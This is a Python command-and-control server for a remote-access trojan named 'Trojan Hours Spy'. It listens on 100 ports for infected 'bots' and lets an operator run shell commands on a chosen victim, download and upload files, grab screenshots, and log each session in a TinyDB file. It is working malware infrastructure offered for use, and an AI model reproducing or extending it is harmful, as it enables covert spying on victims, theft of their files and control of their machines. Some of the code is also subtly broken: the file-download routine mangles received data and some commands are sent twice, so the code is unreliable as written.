import socket
from threading import Thread
from tinydb import TinyDB
import os
from datetime import datetime
from termcolor import colored, cprint


def listen_for_bots(port, clients):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(("", port))
    sock.listen()
    bot, bot_address = sock.accept()
    clients.append(bot)


def main():
    db = TinyDB('db.json')
    chunk_size = 2048
    eof = "<end_of_file>"
    end_result = "<end_of_result>"
    threads = []
    clients = []

    print(' ╔════════════════════════════════════╗')
    print(' ║', end='')
    cprint(' ~~~~~~~~ Trojan Hours Spy ~~~~~~~~ ', 'red',end="║\n")
    #print('╚════════════════════════════════════╝')
    print(read_file('logo.txt'))
    cprint("[+] Server bot waiting for incoming connections",'blue')

    starting_port = 8091

    bots = 100
    for i in range(bots):
        t = Thread(target=listen_for_bots, args=(i + starting_port, clients,), daemon=True)
        threads.append(t)
        t.start()

    program_run = True
    while program_run:
        if len(clients) > 0:
            index = 'phi'
            while not index.isnumeric() and index != 'y':
                print("\n\n\n", 'Client List:')
                for i, c in enumerate(clients):
                    print("\t\t( ", i, " )\t", c.getpeername())
                cprint('[+] Select client by index or press [y] to exit: ','blue')
                index = input()

            if index == 'y':
                break

            if int(index) >= len(clients):
                continue
            print('connected successfully.', 'Write Your Commands:')
            selected_client = int(index)

            command_bot = clients[selected_client]
            # client host
            client_host = command_bot.getpeername()
            # user commands
            user_commands = []

            is_connected = True
            is_waiting = True
            # connected datetime
            connected_time = datetime.now()

            try:
                while is_connected:
                    while is_waiting:
                        # take command from user
                        command = input("> ")
                        command_bot.send(command.encode())
                        user_commands.append(command)

                        # to change root address e.g( cd ./folder , d: )
                        if command.startswith("cd") or \
                                (len(command) == 2 and command[0].isalpha() and command[1] == ":"):
                            #command_bot.send(command.encode())
                            continue

                        # to download file from client e.g( download file_name)
                        elif command.startswith("download "):
                            command_bot.send(command.encode())
                            exists = command_bot.recv(1024)
                            if exists.decode() == "yes":
                                file_name = command.split(' ', 1)[1]
                                download_file(file_name, command_bot, eof, chunk_size)

                                print("Successfully downloaded, ", file_name)
                            else:
                                print("File doesn't exist ")

                        elif command.startswith("upload"):
                            file_to_upload = command.split(' ', 1)[1]
                            if os.path.exists(file_to_upload) and os.path.isfile(file_to_upload):
                                exists = "yes"
                                command_bot.send(exists.encode())
                                answer = command_bot.recv(1024)
                                if answer.decode() == "yes":
                                    upload_file(file_to_upload, command_bot, eof, chunk_size)
                                    print("File sent successfully")
                            else:
                                exists = "no"
                                print("File doesn't exist")
                                command_bot.send(exists.encode())
                                continue

                        elif command == "screenshot":
                            print("taking screenshot")
                            file_name = command_bot.recv(1024)
                            exists = command_bot.recv(1024)

                            if exists.decode() == "yes":
                                answer = "yes"
                                command_bot.send(answer.encode())

                                download_file(file_name, command_bot, eof, chunk_size)

                                print("File Downloaded successfully")
                                is_connected = False
                            else:
                                print("File not exists")
                                continue

                        elif command == "":
                            continue

                        elif command.lower() == "exit":
                            is_waiting = False
                            is_connected = False
                            break

                        else:
                            full_result = b''
                            while True:
                                chunk = command_bot.recv(1024)
                                if chunk.endswith(end_result.encode()):
                                    chunk = chunk[:-len(end_result)]
                                    full_result += chunk
                                    print(full_result.decode())
                                    break
                                else:
                                    full_result += chunk
            except:
                print('error happened, disconnect')
                is_waiting = False
                is_connected = False

            # End
            end = datetime.now()

            insert(db, client_host, connected_time, end, user_commands)

            status = command_bot.recv(1024)
            if status == "disconnected".encode():
                command_bot.close()
                clients.remove(command_bot)

        else:
            cprint("[+] No Clients Connected",'blue')
            cprint('[+] Do You Want To Exit ? Press [Y/N]','blue')
            ans = input()
            if ans == "Y":
                program_run = False
            else:
                program_run = True


# download file
def download_file(file_name, command_bot, eof, chunk_size):
    with open(file_name, "wb") as file:
        print("Downloading ", file_name)
        while True:
            chunk = command_bot.recv(chunk_size)
            if chunk.endswith(eof.encode()):
                chunk = chunk[:len(eof)]
                file.write(chunk)
                break
            file.write(chunk)


# upload file
def upload_file(file_to_upload, command_bot, eof, chunk_size):
    with open(file_to_upload, "rb") as file:
        chunk = file.read(chunk_size)
        print("Uploading File ...")
        while len(chunk) > 0:
            command_bot.send(chunk)
            chunk = file.read(2048)
            # This will run till the end of file
        command_bot.send(eof.encode())


def insert(db, client_host, connected_time, end, user_commands):
    db.insert(
        {'client': client_host, 'connect_at': connected_time.strftime("%H:%M:%S"),
         'disconnect': end.strftime("%H:%M:%S"),
         'commands': user_commands})


def read_file(file_name) -> str:
    lines = ""
    with open(file_name) as f:
        lines = f.readlines()
    return ' '.join([str(line) for line in lines])


# call the main function to execute codes
if __name__ == "__main__":
    main()
